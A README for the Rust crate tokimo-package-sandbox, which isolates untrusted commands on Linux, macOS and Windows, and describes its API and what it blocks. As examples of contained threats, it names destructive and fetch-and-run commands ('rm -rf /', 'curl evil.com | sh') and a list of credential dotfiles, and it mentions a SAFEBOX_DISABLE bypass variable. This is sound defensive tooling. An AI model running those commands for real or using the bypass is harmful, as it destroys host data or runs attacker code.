# tokimo-package-sandbox

[![Crates.io](https://img.shields.io/crates/v/tokimo-package-sandbox.svg)](https://crates.io/crates/tokimo-package-sandbox)
[![Docs.rs](https://docs.rs/tokimo-package-sandbox/badge.svg)](https://docs.rs/tokimo-package-sandbox)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)

A cross-platform Rust sandbox for running arbitrary commands without affecting the host.

Give it a command like `rm -rf /`, `curl evil.com | sh`, or a full interactive `bash` — the host filesystem, network, and process table are safe.

> **Crate name:** `tokimo-package-sandbox`
> **Crate & library name match:** `tokimo-package-sandbox` (import as `use tokimo_package_sandbox::…`).

## Isolation strategy

| OS | Mechanism | Level |
|---|---|---|
| Linux | **bubblewrap** (user / mount / pid / net / uts namespaces) + **seccomp BPF** + POSIX rlimits | strong |
| Linux (fallback) | **firejail** + rlimits | medium |
| macOS | **sandbox-exec** with a generated Seatbelt profile + rlimits | strong (Apple-supported) |
| Windows | Re-executes inside **WSL2** under bubblewrap | strong (VM + Linux sandbox) |

Every invocation is a one-shot process tree inside a fresh set of namespaces — not a long-running container. When the command exits, the namespaces vanish.

## Install

```toml
[dependencies]
tokimo-package-sandbox = "0.1"
```

System prerequisites:

- **Linux**: `sudo apt install bubblewrap` (or `dnf install bubblewrap`). `firejail` works as a fallback.
- **macOS**: nothing. `sandbox-exec` ships with the OS.
- **Windows**: `wsl --install` then inside WSL, `sudo apt install -y bubblewrap`.

## Quick start

```rust
use tokimo_package_sandbox::{SandboxConfig, NetworkPolicy};

fn main() -> anyhow::Result<()> {
    let work = tempfile::tempdir()?;

    let cfg = SandboxConfig::new(work.path())
        .network(NetworkPolicy::Blocked);

    let out = tokimo_package_sandbox::run(&["rm", "-rf", "/"], &cfg)?;

    println!("exit: {}", out.exit_code);
    println!("stdout: {}", out.stdout);
    println!("stderr: {}", out.stderr);
    Ok(())
}
```

Your host filesystem is untouched.

## API

```rust
pub fn run<S: AsRef<str>>(cmd: &[S], cfg: &SandboxConfig) -> Result<ExecutionResult>;

pub struct SandboxConfig {
    pub name: String,
    pub work_dir: PathBuf,
    pub extra_mounts: Vec<Mount>,
    pub network: NetworkPolicy,
    pub limits: ResourceLimits,
    pub env: Vec<(OsString, OsString)>,
    pub stdin: Option<Vec<u8>>,
    pub cwd: Option<PathBuf>,
    pub stream_stderr: bool,
}

pub struct Mount { pub host: PathBuf, pub guest: Option<PathBuf>, pub read_only: bool }

pub enum NetworkPolicy { Blocked, AllowAll }

pub struct ResourceLimits {
    pub max_memory_mb: u64,
    pub timeout_secs: u64,
    pub max_file_size_mb: u64,
    pub max_processes: u64,
}

pub struct ExecutionResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub timed_out: bool,
    pub oom_killed: bool,
}
```

Builder style is supported for every field:

```rust
SandboxConfig::new(work_dir)
    .name("build")
    .network(NetworkPolicy::Blocked)
    .limits(ResourceLimits { max_memory_mb: 256, timeout_secs: 30, max_file_size_mb: 16, max_processes: 64 })
    .mount(Mount::ro("/opt/cache"))
    .mount(Mount::rw("/host/output").guest("/out"))
    .env("LANG", "C.UTF-8")
    .stdin_str("hello")
    .cwd("/tmp")
    .stream_stderr(true);
```

## What the Linux sandbox blocks

- `mount` / `umount` / `pivot_root` / `chroot` (seccomp)
- `ptrace` / `keyctl` / `kexec_load` (seccomp)
- `socket(AF_UNIX)` — no talking to host daemons
- `CLONE_NEWUSER` nesting
- All filesystem writes outside the configured `work_dir`
- Network, when `NetworkPolicy::Blocked` is used (default)
- Memory (`RLIMIT_AS`), CPU seconds (`RLIMIT_CPU`), output file size (`RLIMIT_FSIZE`)
- Wall-clock timeout (monitor thread SIGTERM → SIGKILL)

Sensitive host dotfiles (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, `~/.config`, `~/.npmrc`, `~/.netrc`, various credentials) are tmpfs-blanked even if the user accidentally mounts `$HOME`.

## Examples

```bash
# Sanity check: runs `ls -la /` inside the sandbox.
cargo run --example basic

# Proves host safety: tries `rm -rf /` and `rm -rf $HOME` inside sandbox,
# verifies host canary files still exist.
cargo run --example rm_rf_test

# Interactive bash shell inside the sandbox (`docker run -it` style).
cargo run --example shell
```

## Why not Docker?

Docker is a good answer for "I want a reproducible runtime". It is a heavy answer for "I want to run one untrusted command".

- no daemon, no images, no VM
- ~200 KB runtime dependency (`bwrap`)
- startup in tens of milliseconds
- Rust-native API, no subprocess shelling from your program to `docker run`
- reuses the host's `/usr`, `/bin`, `/lib` read-only, so tools are whatever the host has

Not a Docker replacement. A sharper tool for a narrower job.

## Why not pure Rust?

No kernel cooperation means no real isolation. The three mechanisms used here (Linux namespaces + seccomp, macOS Seatbelt, Windows WSL2) are all operating-system facilities with decades of production use and dedicated security audit. Re-implementing them in userspace Rust would be both a massive effort and a downgrade in assurance.

## Caveats

- Linux seccomp syscall tables are shipped for **x86_64** and **aarch64**. Other architectures still get bwrap's namespace isolation, but no syscall filtering.
- On Windows, running natively (without WSL2) is refused. Windows Job Objects do not provide comparable filesystem isolation.
- Setting `SAFEBOX_DISABLE=1` in the environment bypasses the sandbox. Debug/testing only.

## Documentation

- [`docs/db-as-filesystem.md`](./docs/db-as-filesystem.md) — pattern for exposing a database as a filesystem to sandboxed bash (materialize + diff-and-commit on exit)

## License

MIT. See [LICENSE](./LICENSE).
